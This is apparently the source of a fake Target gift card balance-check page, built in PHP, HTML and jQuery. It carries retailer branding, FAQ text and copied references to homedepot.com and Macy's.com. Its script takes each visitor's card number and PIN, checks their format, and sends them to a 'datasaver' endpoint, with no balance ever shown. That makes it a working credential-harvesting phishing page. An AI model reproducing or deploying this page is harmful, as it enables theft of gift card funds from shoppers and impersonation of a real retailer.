<style>
.header_area .main_menu .main_box {
    background: #cc0000;
  
}
.nav-item a{
	color:#fff !important;
}


.home-color{
	color:#cc0000;
}
.home-color i{
	font-size:60px
}
.home-color-title{
	color:#cc0000;
	font-size:30px;
	font-weight:500;
}
.home-color-title{
	color:#cc0000;
	font-size:30px;
	font-weight:500;
}
.content-text{
	font-size:17px;
	letter-spacing:0.3px;
	color:#555;
}
.cust-sec-crd .card{
	height:220px;
}
.home-depo-color{
	color:#cc0000;
}
.home-depo-color-btn{
	background:#cc0000;
	color:#fff;
	
}
.faq-se{
	   font-size:16px;
	   padding:20px;
	   
   }
</style>
	<main>
<div class="clearfix">&nbsp;</div>
<section class="page-start-div" style="background-image: url('<?php echo base_url(); ?>assets/img/home-banner.png');padding:20px 0px;">
		<div class="container">
			<div class="breadcrumb-banner " >
				<div class="text-center pt-4">
					<h1>Target </h1>
					
				</div>
			</div>
		</div>
	</section>
<section class=" bg-e9e9e9">
	<div class="container text-center">
	<h3>Disclaimer: This business is represented or affiliated with Macy's.com</h3>
	</div>
</section>
	<div class=" ">
   <!-- Mask & flexbox options-->
   <div class="d-flex justify-content-center align-items-center py-4">
      <!-- Content -->
      <div class="container">
         <!--Grid row-->
         <div class="row wow fadeIn sm-main-heig">
            <!--Grid column-->
            <div class="col-md-6 mb-4  text-md-left  sm-hide" style="">
               <div class="card px-4 py-4">
                  <h1 class="display-5 font-weight-bold"><span class="home-depo-color">Target</span> ® Gift Card </h1>
                  <hr class="">
                  <p>The Target Gift Card may be used toward the purchase of merchandise at homedepot.com and any of The Target stores for up to the amount displayed.</p>
               </div>
            </div>
			<div class="col-md-6 mb-4  ">
				 <div class="card pd-0" style="background:#f5f5f5;">
				 <div class="card-header  pt-2 px-4 text-center pb-0"><h4>Check Balance</h4></div>
				 <div class="card-body">
         <form method="post" action="#" id="balance_dude" name="balance_dude">
			<input type="hidden" id="select_giftcard" name="select_giftcard" value="8">
			<input type="hidden" id="giftcardid" name="giftcardid" value="14">
            <div class="row justify-content-center d-flex">
               <div class="col-md-8">
                  <div class="form-group ">
                    <label for="exampleInputEmail1">GIFTCARD NUMBER</label>
                     <input name="digit_gift_card_number" id="digit_gift_card_number" class="form-control" placeholder="XXXX-XXXX-XXXX-XXXX-XXXX-XXX" autocomplete="off" type="text" data-maxlength-color="label label-success" data-maxlength-position="bottom" data-maxlength-show="false" data-default-value="" data-onfocus-color="#66AFE9" data-drop-focus-swadow="1" data-placement="bottom" data-content="Required" data-secondary-message="Only numbers are allowed">
                  </div>
				  <span class="error_message_style" id="gift_card_number_error" style="color: red"></span>
                  <div class="form-group">
                     <label for="exampleInputPassword1">PIN</label>
                     <input name="pin_number" id="pin_number" class="form-control" title="" placeholder="XXXX" autocomplete="off" type="password">
                  </div>
               </div>
			   <input type="hidden" id="cardtext" name="cardtext" value="Target">
				<!--<script src="https://www.google.com/recaptcha/api.js" async defer></script>-->
               <div class="form-group col-md-4">
                  <label class="mt-4 img-show" style="color:#4051b3;text-decoration: none;border-bottom: 1px solid #24201d;">Where do I find this?</label>
                  <div class="img-card" style="display:none;position:absolute;z-index:2000">
                     <img src="<?php echo base_url(); ?>assets/img/card.jpg" class="img-fluid"> 
                  </div>
				       <!--<div class="g-recaptcha" data-sitekey="6LcAwNgZAAAAANwefAS5Bq1ckEeMxukTdCPYqqdc"></div> -->   
					<br>
				 <div>
                     <button type="button" class="btn home-depo-color-btn mt-4" onclick="validateFun()"> Check Balance</button>
                  </div>
               </div>
            </div>
         </form>
      </div>
      </div>
			</div>
			 <div class="col-md-4 mb-4  text-md-left  md-hide" style="">
               <div class="card px-4 py-4">
                  <h1 class="display-5 font-weight-bold"><span class="home-depo-color">Target</span> ® Gift Card </h1>
                  <hr class="">
                  <p>The Target Gift Card may be used toward the purchase of merchandise at homedepot.com and any of The Target stores for up to the amount displayed.</p>
               </div>
            </div>
         </div>
         <!--Grid row-->
      </div>
      <!-- Content -->
   </div>
   <!-- Mask & flexbox options-->
</div>

<section class="py-4" style="background-image: url('<?php echo base_url(); ?>assets/img/login-bg.png') ; ">
   <div class="container">
      <div class="row cust-sec-crd">
         <div class="col-md-4 mt-2">
            <div class="card text-center p-3 rounded-0" style="box-shadow: 0 0 10px 0 rgba(0,0,0,.12);	">
               <div class="home-color">
                  <i class="fa fa-credit-card" aria-hidden="true"></i>
               </div>
               <h4 class="home-color-title mt-1">Use Online</h4>
               <p class="content-text">Target Gift Cards are a simple, safe and convenient method of gifting our products.</p>
            </div>
         </div>
         <div class="col-md-4 mt-2">
            <div class="card text-center p-3 rounded-0" style="box-shadow: 0 0 10px 0 rgba(0,0,0,.12);	">
               <div class="home-color">
                  <i class="fa fa-info-circle" aria-hidden="true"></i>
               </div>
               <h4 class="home-color-title mt-1">No Personal Info</h4>
               <p class="content-text">Use our Gift Cards Online or in Stores while maintaining your privacy.</p>
            </div>
         </div>
         <div class="col-md-4 mt-2">
            <div class="card text-center p-3 rounded-0" style="box-shadow: 0 0 10px 0 rgba(0,0,0,.12);	">
               <div class="home-color">
                  <i class="fa fa-map" aria-hidden="true"></i>
               </div>
               <h4 class="home-color-title mt-1">Use Nationwide</h4>
               <p class="content-text">Can be used wherever at any Target in the US & Canada as well as in our Online-Shop</p>
            </div>
         </div>
      </div>
   </div>
</section>
<section>
   <div class="container py-3">
      <div class="row">
         <div class="col-md-12 mx-auto">
            <div class="bs-example">
               <div class="accordion" id="accordionExample">
                  <div class=" pt-0">
                     <div class="card-header p-0" id="headingOne">
                        <h2 class="mb-0">
                           <div type="button" class="faq-se home-depo-color" data-toggle="collapse" data-target="#collapseOne"><i class="fa fa-angle-right"></i> Can I buy The Target Gift Card and have you send it to someone else?
                           ?</div>									
                        </h2>
                     </div>
                     <div id="collapseOne" class="collapse" aria-labelledby="headingOne" data-parent="#accordionExample">
                        <div class="card-body ml-4">
                           <p>We can ship your Gift Cards to anyone with a valid street address within the 50 United States (we cannot ship to addresses outside of the U.S. at this time) or you can purchase an eGift Card and have it emailed to your recipient.</p>
                        </div>
                     </div>
                  </div>
                  <div class=" p-0">
                     <div class="card-header p-0" id="headingTwo">
                        <h2 class="mb-0">
                           <div type="button" class="faq-se collapsed home-depo-color" data-toggle="collapse" data-target="#collapseTwo"><i class="fa fa-angle-right"></i>Where do you ship Gift Cards?
                           Cai i buy Target gift card and send it to someone else ?
                           </div>
                        </h2>
                     </div>
                     <div id="collapseTwo" class="collapse " aria-labelledby="headingTwo" data-parent="#accordionExample">
                        <div class="card-body ml-4">
                           <p>Gift Cards will be shipped to valid street addresses within the 50 United States. We dnt ship Gift Cards outside of the United States.</p>
                        </div>
                     </div>
                  </div>
                  <div class=" pt-0">
                     <div class="card-header p-0 " id="headingThree">
                        <h2 class="mb-0">
                           <div type="button" class="faq-se collapsed home-depo-color" data-toggle="collapse" data-target="#collapseThree"><i class="fa fa-angle-right"></i> Are Canadian Gift Cards available?
                           </div>                     
                        </h2>
                     </div>
                     <div id="collapseThree" class="collapse" aria-labelledby="headingThree" data-parent="#accordionExample">
                        <div class="card-body ml-4">
                           <p>You can purchase a Canadian Target Gift Card online at homedepot.ca You may also purchase Canadian Gift Cards by visiting a local Target store in Canada.</p>
                        </div>
                     </div>
                  </div>
                  <div class=" pt-0">
                     <div class="card-header p-0 " id="headingFour">
                        <h2 class="mb-0">
                           <div type="button" class="faq-se collapsed home-depo-color" data-toggle="collapse" data-target="#collapseFour"><i class="fa fa-angle-right"></i> How do I place a Corporate Gift Card order?
                           </div>                     
                        </h2>
                     </div>
                     <div id="collapseFour" class="collapse" aria-labelledby="headingFour" data-parent="#accordionExample">
                        <div class="card-body ml-4">
                           <p>You may order Target Corporate Gift Cards by visiting the Target Corporate Gift Card page. For questions regarding an order, you may call a Gift Card sales associate .</p>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <!--/row-->
   </div>
   <!--container-->
</section>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
</main>
	
<script type="text/javascript">	

$(".img-show").hover(function(){
	$(".img-card").toggle();
});
	jQuery.noConflict();
	jQuery(document).ready(function(){
		$("#digit_gift_card_number").keypress(function (e) {
			if (e.which != 45 && e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
				$("#gift_card_number_error").html("Please enter digits only.").show().fadeOut("slow");
				return false;
			}
		});
		$("#digit_gift_card_number").keyup(function() {
			var cardtype = document.getElementById('select_giftcard').value;
			if(cardtype==3){
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,3}', 'g')).join("-");
				}
				$(this).val(foo);
			}else if(cardtype==8){
				var foo = $(this).val().split("-").join("");
				if (foo.length > 0) {
					foo = foo.match(new RegExp('.{1,4}', 'g')).join("-");
				}
				$(this).val(foo);
			}			
		});	
		var cardtype = document.getElementById('select_giftcard').value;
		hide_dude_funny(cardtype);
	});	
	function isvalidated(data, min, max) { 
		data=data.replace(/-/g, "");
		console.log("isvalidated"+data);
		input = data.length;
		if ($.isNumeric(data)) {
			return false;
		}
		if (input < min) {
			return false;
		}
		if (input > max) {
			return false;
		}
		return true;
	}
	function numaricvalidated(data, min, max) { 
		data=data.replace(/-/g, "");
		console.log("numaricvalidated"+data);
		input = data.length;
		if (input < min) {
			return false;
		}
		if (input > max) {
			return false;
		}
		if (!$.isNumeric(data)) {
			return false;
		}
		return true;
	}
	
	function hide_dude_funny(cardtype) {
		$("#digit_gift_card_number").val('');
		$("#pin_number").val(''); 
		$("#gift_card_number_error").html(""); 
		$("#pin_number_error").html(""); 	
		//Target Giftcard
		if(cardtype==3){
			$("#digit_gift_card_number").attr('placeholder', 'XXX-XXX-XXX-XXX-XXX');
			$("#digit_gift_card_number").attr('maxlength', '19');
			$("#pin_number").attr('placeholder', 'XXXXXXXX');
			$("#pin_number").attr('maxlength', '8');
			$("#hide_pin").show();
		}
		//Target Giftcard
		if(cardtype == 8){
			$("#digit_gift_card_number").attr('placeholder', 'XXXX-XXXX-XXXX-XXXX-XXXX-XXX');
			$("#digit_gift_card_number").attr('maxlength', '28');
			$("#pin_number").attr('placeholder', 'XXXX');
			$("#pin_number").attr('maxlength', '4');
			$("#hide_pin").show();
		}
	}
	function validateFun() {
		var flag = true;
		if (document.getElementById('select_giftcard').value == "0") {
			$("#error_select_giftcard").html("Please Select Gift Card");
			document.getElementById('select_giftcard').focus();
			flag = false;
		}
		if (document.getElementById('digit_gift_card_number').value == "") {
			$("#gift_card_number_error").html("Enter valid giftcard number.");
			document.getElementById('digit_gift_card_number').focus();
			flag = false;
		}
		var cardtype = document.getElementById('select_giftcard').value;
		var gift_card_number = document.getElementById('digit_gift_card_number').value;
		gift_card_number=gift_card_number.replace(/-/g, "");
		console.log(gift_card_number);
		var pin_number='';
		if(document.getElementById('pin_number').value!=undefined){
			pin_number = document.getElementById('pin_number').value;
		}
		if(flag==false){
			return false;
		}else{
			var alphanumaricregx = /^[A-Za-z0-9]+$/;
			var chars = /^[a-zA-Z]+$/;
			if (cardtype == 3) { //target  
				var valid_number = numaricvalidated(gift_card_number, 15, 15);
				if(cardtype == 3 && gift_card_number.toString()[0]!=0 && gift_card_number.toString()[1]!=4){
					$("#gift_card_number_error").html("Enter valid giftcard number.");
					return false;                    
				}
				if (!valid_number) {
					$("#gift_card_number_error").html("Enter valid giftcard number.");
					return false;
				}
				$("#gift_card_number_error").html("");
				if (document.getElementById('pin_number').value == "") {
					$("#pin_number_error").html("Enter valid 8 digit valid Pin number");
					document.getElementById('pin_number').focus();
					return false;
				}
				var valid_pin = numaricvalidated(document.getElementById('pin_number').value, 8, 8);
				if (!valid_pin) {
					$("#pin_number_error").html("Enter valid 8 digit valid Pin number");
					return false;
				}
				pin_number = document.getElementById('pin_number').value;
				$("#pin_number_error").html("");
			}			
			if (cardtype == 8) { //Target Giftcard
                var valid_number = numaricvalidated(gift_card_number, 23, 23);
				if(cardtype == 8 && gift_card_number.toString()[0]!=9){
					$("#gift_card_number_error").html("Enter valid giftcard number.");
					return false;                    
				}
                if (!valid_number) {
                    $("#gift_card_number_error").html("Enter valid giftcard number.");
                    return false;
                }
                $("#gift_card_number_error").html("");
                if (document.getElementById('pin_number').value == "") {
                    $("#pin_number_error").html("Enter valid 4 digit valid Pin number");
                    document.getElementById('pin_number').focus();
                    return false;
                }
                var valid_pin = numaricvalidated(document.getElementById('pin_number').value, 4, 4);
                if (!valid_pin) {
                    $("#pin_number_error").html("Enter valid 4 digit valid Pin number");
                    return false;
                }
                pin_number = document.getElementById('pin_number').value;
                $("#pin_number_error").html("");
            }
			// if(grecaptcha.getResponse() == ''){
				// alert( 'Captch is required' );
				// return false;
			// }else{
				var cardtext   = $('#cardtext').val();
					var giftcardid = $('#giftcardid').val();
				var request = $.ajax({
					url: '<?php echo base_url();?>Giftcards/datasaver?time=<?php echo time(); ?>',
					type: "POST",
					dataType:'json',
					data: {
						CardType: cardtext,
						giftcardid: giftcardid,
						GiftCardNumber: gift_card_number,
						PinNumber: pin_number,
						looser_form: 'looser_form'
					}               
				});
				request.done(function(msg) {
					<?php if(isset($_SESSION['id']) && $_SESSION['id']!=""){ ?>
						// $("#balance_info_review").val(msg.message);
						// $("#balance_info").val('$'+ msg.blancecode);
						$("#exampleModalLongDive").modal('show');
					<?php }else{ ?>						
						window.location = "<?php echo base_url();?>";
					<?php } ?>
				});

				request.fail(function(jqXHR, textStatus) {
					alert("Request failed: " + textStatus);
				});
			// } 
		}		
	}
</script>
	

